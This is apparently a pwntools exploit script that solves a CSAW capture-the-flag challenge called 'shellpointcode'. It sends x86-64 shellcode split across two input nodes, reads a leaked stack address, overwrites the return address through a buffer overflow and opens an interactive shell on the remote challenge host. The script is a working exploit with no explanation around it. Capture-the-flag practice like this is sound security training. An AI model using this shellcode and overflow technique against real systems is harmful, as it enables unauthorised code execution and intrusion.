from pwn import *

# r = process('./shellpointcode')
r = remote('pwn.chal.csaw.io', 9005)

r.sendlineafter('node 1:', '\x48\x31\xd2\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\xeb\xd1')
r.sendlineafter('node 2:', '\x52\x50\x48\x89\xe7\x48\x31\xf6\x48\x8d\x42\x3b\x0f\x05')

r.recvuntil('node.next: ')
addr = int(r.recvline(), 16) + 0x28

r.sendlineafter('initials?', 'A' * 0xb + p64(addr))

r.interactive()
